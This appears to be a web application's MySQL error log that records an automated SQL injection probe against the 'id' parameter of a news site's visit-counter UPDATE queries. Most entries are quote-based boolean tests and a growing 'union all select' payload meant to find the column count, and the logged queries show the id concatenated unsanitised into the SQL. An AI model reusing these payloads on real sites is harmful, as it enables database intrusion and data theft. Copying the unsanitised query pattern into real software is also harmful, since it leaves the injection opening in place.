+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536,0x313032353438303' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536,0x31303235343830303536--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536,0x31303235343830303536--
+
+Time : 17:38:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select 0x31303235343830303536--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 union all select 0x31303235343830303536--
+
+Time : 17:38:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831'
+
+Time : 17:38:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831" and "x"="y
+
+Time : 17:38:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831" and "x"="x
+
+Time : 17:38:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831' and 'x'='y
+
+Time : 17:38:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6831' and 'x'='x
+
+Time : 16:54:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 14:55:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 08:53:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 08:52:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
